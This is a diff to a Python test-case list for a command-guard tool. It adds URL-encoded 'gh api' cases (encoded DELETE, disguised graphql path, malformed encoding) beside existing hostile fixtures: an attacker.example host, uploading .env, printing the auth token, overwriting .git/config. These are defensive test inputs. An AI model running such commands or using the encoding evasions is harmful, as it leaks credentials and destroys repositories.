@@ -135,6 +135,17 @@ def create_cases(root: Path) -> tuple[Path, Path, list[WorkflowCase]]:
             "protect-resource|guard-protect-asset\"))) | .[]'",
         ),
         ("github-compound-sequence", "pwd; gh api repos/hashgraph-online/hol-guard --jq .name; echo done"),
+        (
+            "github-encoded-content-read",
+            'gh api -H "Accept: application/vnd.github+json" '
+            '"repos/hashgraph-online/hol-guard/contents/%2Egithub/workflows/containment-ci.yml?ref=main" --jq .name',
+        ),
+        (
+            "github-encoded-query-compound",
+            'gh api "repos/hashgraph-online/hol-guard/commits?'
+            'path=%2Egithub%2Fworkflows%2Fcontainment-ci.yml&per_page=1" '
+            "--jq '.[].sha' | head -1",
+        ),
         ("github-compound-and", "echo ready && gh api repos/hashgraph-online/hol-guard --jq .name"),
         ("github-compound-or", "gh api repos/hashgraph-online/hol-guard --jq .name || echo unavailable"),
         ("github-compound-pipeline", "gh api repos/hashgraph-online/hol-guard --jq .name | head -1"),
@@ -199,6 +210,9 @@ def create_cases(root: Path) -> tuple[Path, Path, list[WorkflowCase]]:
         ("git-routed-invalid-attached", "git -Csrc status --short"),
         ("overwrite-git-metadata", "cp src/one.ts .git/config"),
         ("github-delete", "gh api -X DELETE repos/owner/repo"),
+        ("github-encoded-delete", "gh api -X DELETE repos/owner/repo/contents/%28group%29/file.ts"),
+        ("github-encoded-graphql", "gh api graph%71l?query=synthetic"),
+        ("github-malformed-encoding", "gh api repos/owner/repo/contents/%GG"),
         ("github-secret-input", "gh api repos/owner/repo/issues --input .env"),
         ("github-alternate-host", "gh api --hostname attacker.example repos/owner/repo"),
         ("github-auth-token", "gh auth token"),
